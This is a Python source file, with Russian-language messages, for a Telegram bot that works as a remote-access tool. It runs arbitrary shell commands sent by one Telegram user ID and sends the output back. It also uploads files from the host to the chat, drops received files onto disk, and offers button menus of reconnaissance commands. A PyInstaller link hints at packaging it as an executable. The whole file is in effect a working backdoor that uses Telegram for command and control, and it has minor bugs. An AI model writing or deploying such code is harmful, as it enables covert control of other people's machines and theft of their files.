
import telebot
from telebot import types
import subprocess, os

id = int('your id') # see message.chat.id
token = str('token')


bot_non_stop = True
bot = telebot.TeleBot(token)
bot.send_message(str(id), text='--------- Start ---------')
# ----------------------------- function -----------------------------


def change_working_directory_to(path):
    os.chdir(path)
    return path


def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


def send_message(message, text):
    if len(text) > 3000:
        for x in range(0, len(text), 3000):
            bot.send_message(message.chat.id, text[x:x+3000])
    else:
        bot.send_message(message.chat.id, text)


def send_command_file(message, command, decoder):
    file_name = f"command_{command}_{decoder}.txt"
    with open(file_name, "w", encoding=decoder) as file:
        file.write(execute_system_command(command).decode(decoder))

    f = open(file_name, "rb")
    bot.send_message(message.chat.id, '[+] Загрузка ...')
    bot.send_document(message.chat.id, f)
    f.close()
    os.remove(file_name)

# ----------------------------- handler -----------------------------


@bot.message_handler(commands=['decode_change'])
def decode_change(message):
    global dec
    if dec == 'utf-8':
        dec = 'latin-1'
        bot.send_message(message.chat.id, text="dec = 'latin-1'")
    elif dec == "latin-1":
        dec = 'cp1251'
        bot.send_message(message.chat.id, text="dec = 'cp1251'")
    elif dec == "cp1251":
        dec = 'utf-8'
        bot.send_message(message.chat.id, text="dec = 'utf-8'")


@ bot.message_handler(commands=['keyboard_linux'])
def keyboard_linux(message):
    keyb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ['cd', 'cd ..', 'pwd', 'ls', '$ ls -l', '$ ls -a', 'whoami', 'killbot']
    keyb.add(*buttons)
    bot.send_message(message.chat.id, 'Клавиатура LINUX', reply_markup=keyb)


@bot.message_handler(commands=['keyboard_linux_f'])
def keyboard_linux_f(message):
    keyb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ['cd', 'cd ..', 'pwd', 'ls', '$f ls -l', '$f ls -a', 'whoami', 'killbot']
    keyb.add(*buttons)
    bot.send_message(message.chat.id, 'Клавиатура LINUX', reply_markup=keyb)


@bot.message_handler(commands=['keyboard_windows'])
def keyboard_windows(message):
    keyb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ['cd', 'cd ..', 'dir', '$ systeminfo', '$ whoami', 'killbot', '$ tree', '$ ipconfig',
               '$ tasklist', '$ help', '$ chcp 1251', '$ chcp 65001', '$ chcp 866']
    keyb.add(*buttons)
    bot.send_message(message.chat.id, 'Клавиатура WINDOWS', reply_markup=keyb)


@bot.message_handler(commands=['keyboard_windows_f'])
def keyboard_windows_f(message):
    keyb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ['cd ..', '$f dir', '$f systeminfo', '$f whoami', 'killbot', '$f tree', '$f ipconfig',
               '$f tasklist', '$f help', '$ chcp 1251', '$ chcp 65001']
    keyb.add(*buttons)
    bot.send_message(message.chat.id, 'Клавиатура WINDOWS', reply_markup=keyb)


@bot.message_handler(commands=['start'])
def start(message):
    mess = '<b> --------- Start --------- </b>'
    bot.send_message(message.chat.id, mess, parse_mode='html')


@bot.message_handler(commands=['bot_non_stop'])
def bot_non_stop(message):
    global bot_non_stop

    if bot_non_stop == True:
        mess = 'bot_non_stop == False'
        bot_non_stop = False

    elif bot_non_stop == False:
        mess = 'bot_non_stop == True'
        bot_non_stop = True

    bot.send_message(message.chat.id, mess)


@bot.message_handler(commands=['help'])
def help(message):
    mess = 'Windows \n https://htmlacademy.ru/blog/boost/tools/windows-command-line \n' \
           'Linux \n https://selectel.ru/blog/basic-linux-commands/ \n' \
           '\n https://losst.ru/42-komandy-linux-kotorye-vy-dolzhny-znat \n ' \
           'Mac \n https://macmy.ru/pages/terminal-commands-macosx \n' \
           'Кодировка windows \n http://microsin.net/adminstuff/windows/bad-encoding-symbols-in-windows-console.html \n' \
           'Pyinstaller \n https://pythonru.com/biblioteki/pyinstaller \n'

    bot.send_message(message.chat.id, mess, parse_mode='html')
    mess = '1251 - Windows - кодировка(Кириллица)' \
           '866 - DOS - кодировка' \
           '65001 - Кодировка UTF - 8'
    bot.send_message(message.chat.id, mess, parse_mode='html')


@bot.message_handler(content_types='text')
def text(message: types.Message):
    global id
    if message.from_user.id == id:
        command = str(message.text).split()[0]
        if len(str(message.text).split()) > 1:
            command_text = message.text.replace(f'{command} ', '')
        else:
            command_text = None

        try:
            if command == 'cd':
                change_working_directory_to(command_text)
                bot.send_message(message.chat.id, '[+]')

            elif command == 'download':
                f = open(command_text, "rb")
                bot.send_message(message.chat.id, '[+] Загрузка ...')
                bot.send_document(message.chat.id, f)
                f.close()

            elif command == 'killbot':
                bot.send_message(message.chat.id, '[+] Завершение сеанса')
                bot.stop_polling()
                bot.stop_bot()
                print(5 + '5')

            elif command == '$':
                command_result = execute_system_command(command_text)
                send_message(message, command_result)

            elif command == '$f':
                try:
                    send_command_file(message, command_text, 'utf-8')
                except:
                    send_command_file(message, command_text, 'cp1250')

            else:
                command_result = execute_system_command(command)
                send_message(message, command_result)

        except Exception as e:
            send_message(message, f'[-] Ошибка: \n{e}')
    else:
        bot.send_message(message.chat.id, 'Вход запрещен', parse_mode='html')


@bot.message_handler(content_types=['document', 'photo'])
def send_text(message):
    if message.from_user.id == id:
        file_name = message.document.file_name
        file_id_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_id_info.file_path)
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(message.chat.id, f'[+] Файл {file_name} загружен')
    else:
        bot.send_message(message.chat.id, 'Вход запрещен', parse_mode='html')


while bot_non_stop:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        pass

